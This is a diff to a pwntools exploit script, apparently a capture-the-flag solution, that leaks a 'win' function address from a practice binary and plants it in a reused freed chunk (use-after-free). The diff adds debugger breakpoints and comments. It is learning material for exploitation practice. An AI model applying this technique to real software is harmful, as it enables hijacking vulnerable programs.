@@ -14,6 +14,9 @@ def start(argv=[], *a, **kw):
 # Specify GDB script here (breakpoints etc)
 gdbscript = '''
 init-pwndbg
+break *0x8048d6f
+break *0x8048aff
+break *0x8048a61
 continue
 '''.format(**locals())
 
@@ -22,7 +25,7 @@ exe = './vuln'
 # This will automatically get context arch, bits, os etc
 elf = context.binary = ELF(exe, checksec=False)
 # Change logging level to help with debugging (error/warning/info/debug)
-context.log_level = 'debug'
+context.log_level = 'info'
 
 # ===========================================================
 #                    EXPLOIT GOES HERE
@@ -31,11 +34,11 @@ context.log_level = 'debug'
 # Start program
 io = start()
 
-# Create user
+# Create user (not needed, just for demo)
 io.sendlineafter(b'(e)xit', b'M')
 io.sendlineafter(b':', b'crypto')
 
-# Leak memory
+# Leak memory (win address)
 io.sendlineafter(b'(e)xit', b'S')
 io.recvuntil(b'OOP! Memory leak...', drop=True)
 leak = int(io.recvlineS(), 16)
@@ -46,6 +49,7 @@ io.sendlineafter(b'(e)xit', b'I')
 io.sendlineafter(b'?', b'Y')
 
 # Leave a message (leaked address)
+# The freed chunk will be reused
 io.sendlineafter(b'(e)xit', b'L')
 io.sendlineafter(b':', flat(leak))
 
